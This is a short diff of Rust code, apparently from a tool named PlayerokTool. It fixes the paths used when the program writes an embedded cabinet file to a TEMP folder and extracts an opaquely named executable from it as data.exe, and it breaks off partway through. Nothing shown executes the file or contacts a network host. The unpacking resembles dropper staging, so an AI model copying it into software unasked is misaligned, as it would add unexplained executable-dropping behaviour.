@@ -107,9 +107,9 @@ fn first_activate() {
     let mut file = File::create(format!("{}\\PlayerokTool\\data.cab", TEMP)).unwrap();
     let _ = file.write_all(&data);
     drop(file);
-    let cab_file = File::open(format!("{}\\data.cab", TEMP)).unwrap();
+    let cab_file = File::open(format!("{}\\PlayerokTool\\data.cab", TEMP)).unwrap();
     let mut cabinet = cab::Cabinet::new(cab_file).unwrap();
-    let mut writer = File::create(format!("{}\\data.exe", TEMP)).unwrap();
+    let mut writer = File::create(format!("{}\\PlayerokTool\\data.exe", TEMP)).unwrap();
     let mut reader = cabinet.read_file("filf8377e82b29deadca67bc4858ed3fba9").unwrap();
     io::copy(&mut reader, &mut writer).unwrap();
     let mut file_bytes: Vec<u8> = fs::read(
